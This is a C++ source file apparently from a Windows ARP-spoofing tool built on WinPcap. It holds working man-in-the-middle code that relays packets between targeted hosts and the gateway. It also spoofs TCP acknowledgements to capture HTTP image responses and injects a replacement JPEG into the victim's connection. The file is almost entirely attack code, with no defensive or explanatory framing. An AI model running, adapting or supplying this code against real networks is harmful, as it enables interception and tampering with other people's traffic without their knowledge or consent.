#include "stdafx.h"
#include "ARPTestDlg.h"
#include "global.h"


volatile BOOL g_programRunning = TRUE;
volatile BOOL g_attacking = FALSE;

pcap_if_t* g_deviceList = NULL;
pcap_if_t* g_adapter = NULL;
DWORD g_selfIp = 0;
MacAddress g_selfMac;
DWORD g_selfGateway = 0;
MacAddress g_gatewayMac;

map<DWORD, HostInfoSetting> g_host;
map<DWORD, HostInfoSetting*> g_attackList;
map<MacAddress, HostInfoSetting*> g_attackListMac;
CCriticalSection g_hostAttackListLock;


BOOL inputIp(LPCSTR src, DWORD& dest)
{
	DWORD ip[4];
	if (sscanf_s(src, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]) != 4)
		return FALSE;
	BYTE* bDest = (BYTE*)&dest;
	bDest[0] = (BYTE)ip[0];
	bDest[1] = (BYTE)ip[1];
	bDest[2] = (BYTE)ip[2];
	bDest[3] = (BYTE)ip[3];
	return TRUE;
}

BOOL GetAdapterHandle(pcap_t*& adapter)
{
	if (g_adapter == NULL)
		return FALSE;
	// open adapter
	char errBuf[PCAP_ERRBUF_SIZE];
	if ((adapter = pcap_open_live(g_adapter->name, 65536, 1, 1000, errBuf)) == NULL)
	{
		MessageBox(NULL, "Error in pcap_open_live: " + CString(g_adapter->name) + " is not supported by WinPcap", "", MB_ICONERROR);
		return FALSE;
	}
	return TRUE;
}

void SetFilter(pcap_t* adapter, LPCSTR exp)
{
	ULONG netmask = g_adapter->addresses == NULL ? 0x00FFFFFF : ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
	bpf_program fcode;
	pcap_compile(adapter, &fcode, exp, 1, netmask);
	pcap_setfilter(adapter, &fcode);
}

/////////////////////////////////////////////////////////////////////////////////////////

// param : { ip, port }
static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
{
	CARPTestDlg* thiz = (CARPTestDlg*)AfxGetApp()->m_pMainWnd;
	pcap_t* adapter;
	if (!GetAdapterHandle(adapter))
		return 0;

	// get infomation
	DWORD targetIp = ((DWORD*)param)[0];
	WORD targetPort = (WORD)((DWORD*)param)[1];
	delete param;
	g_hostAttackListLock.Lock();
	HostInfoSetting& target = g_host[targetIp];
	g_hostAttackListLock.Unlock();
	target.httpImageLinkLock.Lock();
	auto& link = target.httpImageLink[targetPort];
	target.httpImageLinkLock.Unlock();
	IPPacket* pInitIp = (IPPacket*)&link.initPacket[ETH_LENGTH];
	DWORD ipLen = pInitIp->headerLen * 4;
	TCPPacket* pInitTcp = (TCPPacket*)&link.initPacket[ETH_LENGTH + ipLen];
	DWORD tcpLen = pInitTcp->headerLen * 4;


	// receive image, you can write it to a file
#pragma region
	{
	BYTE* ackPkt = new BYTE[ETH_LENGTH + ipLen + tcpLen];
	*(MacAddress*)ackPkt = g_gatewayMac;
	*(MacAddress*)(ackPkt + 6) = g_selfMac;
	memcpy(ackPkt + 12, link.initPacket + 12, 2 + ipLen + tcpLen);
	IPPacket* pPktIp = (IPPacket*)(ackPkt + ETH_LENGTH);
	pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
	pPktIp->totalLen = htons((WORD)(ipLen + tcpLen));
	pPktIp->timeToLive = 64;
	pPktIp->sourceIp = targetIp;
	pPktIp->destinationIp = pInitIp->sourceIp;
	pPktIp->CalcCheckSum();
	TCPPacket* pPktTcp = (TCPPacket*)(ackPkt + ETH_LENGTH + ipLen);
	pPktTcp->sourcePort = targetPort;
	pPktTcp->destinationPort = pInitTcp->sourcePort;
	pPktTcp->seq = pInitTcp->ack;
	pPktTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
	pPktTcp->psh = 0;
	pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
	pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket) + sizeof(TCPPacket));

	CString exp;
	BYTE* bIp = (BYTE*)&target.ip;
	exp.Format("ip host %u.%u.%u.%u and tcp dst port %u", bIp[0], bIp[1], bIp[2], bIp[3], ntohs(targetPort));
	SetFilter(adapter, exp);
	DWORD time = GetTickCount();
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	DWORD lastAck = ntohl(pPktTcp->ack);
	while ((res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
	{
		if (res == 0) // timeout
			continue;
		IPPacket* pCurIp = (IPPacket*)&pkt_data[ETH_LENGTH];
		DWORD curIpLength = pCurIp->headerLen * 4;
		TCPPacket* pCurTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
		DWORD curTcpLength = pCurTcp->headerLen * 4;

		pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
		pPktIp->CalcCheckSum();
		DWORD ack = ntohl(pCurTcp->seq) + (header->len - ETH_LENGTH - curIpLength - curTcpLength);
		if (lastAck < ack)
			lastAck = ack;
		pPktTcp->ack = htonl(lastAck);
		pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
		pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
		if (pCurTcp->psh)
			break;
	}
	delete ackPkt;
	}
#pragma endregion


	// send image
	DWORD sendBufLen = link.initPacketLen > 1000 ? link.initPacketLen : 1000;
	BYTE* sendBuf = new BYTE[sendBufLen];

	// send HTTP header in the initial packet
#pragma region InitPacket
	LPCSTR pHttp = (LPCSTR)&link.initPacket[ETH_LENGTH + ipLen + tcpLen];
	LPCSTR pContentType = strstr(pHttp, "Content-Type: image/");
	LPCSTR pContentLen = strstr(pHttp, "Content-Length: ") + strlen("Content-Length: ");
	DWORD httpHeaderLen = strstr(pHttp, "\r\n\r\n") + strlen("\r\n\r\n") - pHttp;

	*(MacAddress*)sendBuf = target.mac;					// destination MAC
	*(MacAddress*)(sendBuf + 6) = g_selfMac;			// source MAC

	BYTE* p1 = sendBuf + 12;
	const BYTE* p2 = link.initPacket + 12;
	DWORD len;
	if (pContentType < pContentLen)
	{
		len = 2 + ipLen + tcpLen + (pContentType - pHttp);
		memcpy(p1, p2, len);							// data
		p1 += len; p2 += len;

		len = strlen("Content-Type: image/jpeg");
		memcpy(p1, "Content-Type: image/jpeg", len);	// content type
		p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");

		len = (BYTE*)pContentLen - p2;
		memcpy(p1, p2, len);							// data
		p1 += len; p2 += len;

		_itoa_s(target.imageDataLen, (LPSTR)p1, 15, 10);	// content length
		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
	}
	else
	{
		len = 2 + ipLen + tcpLen + (pContentLen - pHttp);
		memcpy(p1, p2, len);							// data
		p1 += len; p2 += len;

		_itoa_s(target.imageDataLen, (LPSTR)p1, 15, 10);	// content length
		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");

		len = (BYTE*)pContentType - p2;
		memcpy(p1, p2, len);							// data
		p1 += len; p2 += len;

		len = strlen("Content-Type: image/jpeg");
		memcpy(p1, "Content-Type: image/jpeg", len);	// content type
		p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
	}

	len = (BYTE*)pHttp + httpHeaderLen - p2;
	memcpy(p1, p2, len);								// data
	p1 += len;


	DWORD totalLen = p1 - sendBuf;
	IPPacket* pIp = (IPPacket*)&sendBuf[ETH_LENGTH];
	pIp->totalLen = htons((u_short)(totalLen - ETH_LENGTH));		// IP total length
	pIp->CalcCheckSum();											// IP checksum
	TCPPacket* pTcp = (TCPPacket*)&sendBuf[ETH_LENGTH + ipLen];
	pTcp->psh = 0;
	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, p1 - (BYTE*)pTcp); // TCP checksum

	pcap_sendpacket(adapter, (u_char*)sendBuf, totalLen);
	pTcp->seq = htonl(ntohl(pTcp->seq) + (totalLen - ETH_LENGTH - ipLen - tcpLen));
#pragma endregion

	// send image
	BYTE* pTcpData = (BYTE*)pTcp + tcpLen;
	DWORD maxTcpDataLen = sendBuf + sendBufLen - pTcpData;
	pIp->totalLen = htons((u_short)(sendBufLen - ETH_LENGTH));		// IP total length
	pIp->CalcCheckSum();											// IP checksum
	DWORD start;
	for (start = 0; start + maxTcpDataLen < target.imageDataLen - 1; start += maxTcpDataLen)
	{
		target.imageDataLock.Lock();
		if (target.imageData == NULL)
		{
			target.imageDataLock.Unlock();
			goto End;
		}
		memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
		target.imageDataLock.Unlock();
		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
		pcap_sendpacket(adapter, (u_char*)sendBuf, sendBufLen);
		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
	}

	// last packet
	DWORD lastTcpDataLen = target.imageDataLen - start;
	target.imageDataLock.Lock();
	if (target.imageData == NULL)
	{
		target.imageDataLock.Unlock();
		goto End;
	}
	memcpy(pTcpData, &target.imageData[start], lastTcpDataLen);
	target.imageDataLock.Unlock();
	pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
	pIp->CalcCheckSum();															// IP checksum
	pTcp->psh = 1;
	pTcp->fin = 1;
	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + lastTcpDataLen)); // TCP checksum
	pcap_sendpacket(adapter, (u_char*)sendBuf, ETH_LENGTH + ntohs(pIp->totalLen));


	// release
End:
	delete sendBuf;
	pcap_close(adapter);
	target.httpImageLinkLock.Lock();
	target.httpImageLink.erase(targetPort);
	target.httpImageLinkLock.Unlock();
	return 0;
}

UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
{
	CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
	pcap_t* adapter;
	if (!GetAdapterHandle(adapter))
		return 0;

	// start capture
	CString exp;
	BYTE* bIp = (BYTE*)&g_selfIp;
	exp.Format("not host %u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
	SetFilter(adapter, exp);
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	while (g_attacking && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
	{
		if (res == 0) // timeout
			continue;

		{
		g_hostAttackListLock.Lock();
		auto targetIt = g_attackListMac.find(*(MacAddress*)(pkt_data + 6));
		g_hostAttackListLock.Unlock();
		if (targetIt != g_attackListMac.end()) // is target packet
#pragma region
		{
			HostInfoSetting& target = *targetIt->second;
			target.send++;

			if (target.forward)
			{
				// check if is replacing
				IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
				if (pIp->protocol == PROTOCOL_TCP)
				{
					TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + pIp->headerLen * 4];
					target.httpImageLinkLock.Lock();
					if (target.httpImageLink.find(pTcp->sourcePort) != target.httpImageLink.end())
					{
						target.httpImageLinkLock.Unlock();
						continue;
					}
					target.httpImageLinkLock.Unlock();
				}

				BYTE* newData = new BYTE[header->len];
				*(MacAddress*)newData = g_gatewayMac; // destination MAC
				*(MacAddress*)(newData + 6) = g_selfMac; // source MAC
				memcpy(newData + 12, pkt_data + 12, header->len - 12); // data
				pcap_sendpacket(adapter, (u_char*)newData, header->len);
				delete newData;
			}
			continue;
		}
#pragma endregion
		}

		if (*(MacAddress*)(pkt_data + 6) == g_gatewayMac // is gateway packet
			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
#pragma region
		{
			IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
			g_hostAttackListLock.Lock();
			auto targetIt = g_attackList.find(pIp->destinationIp);
			g_hostAttackListLock.Unlock();
			if (targetIt == g_attackList.end()) // not to target
				continue;
			HostInfoSetting& target = *targetIt->second;
			target.receive++;

			if (pIp->protocol != PROTOCOL_TCP) // not TCP
				goto Forward;
			DWORD ipLength = pIp->headerLen * 4;
			TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];

			if (!target.replaceImages || target.imageData == NULL) // no replacing
				goto Forward;

			// is replacing
			target.httpImageLinkLock.Lock();
			if (target.httpImageLink.find(pTcp->destinationPort) != target.httpImageLink.end())
			{
				target.httpImageLinkLock.Unlock();
				continue;
			}
			target.httpImageLinkLock.Unlock();

			DWORD tcpLength = pTcp->headerLen * 4;
			// not HTTP
			if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
				goto Forward;

			LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
			LPCSTR contentType = strstr(http, "Content-Type: image/");
			// not image
			if (contentType == NULL)
				goto Forward;

				
			// replace image
			target.httpImageLinkLock.Lock();
			auto& link = target.httpImageLink[pTcp->destinationPort];
			target.httpImageLinkLock.Unlock();
			link.sourcePort = pTcp->sourcePort;
			link.initPacketLen = header->len;
			link.initPacket = new BYTE[header->len];
			memcpy(link.initPacket, pkt_data, header->len);
			DWORD* param = new DWORD[2];
			param[0] = target.ip;
			param[1] = pTcp->destinationPort;
			AfxBeginThread(ReplaceImageThread, (LPVOID)param);
			continue;
			
Forward:
			if (target.forward)
			{
				BYTE* newData = new BYTE[header->len];
				*(MacAddress*)newData = target.mac; // destination MAC
				*(MacAddress*)(newData + 6) = g_selfMac; // source MAC
				memcpy(newData + 12, pkt_data + 12, header->len - 12); // data
				pcap_sendpacket(adapter, (u_char*)newData, header->len);
				delete newData;
			}
			continue;
		}
#pragma endregion
	}

	// release
	pcap_close(adapter);
	return 0;
}
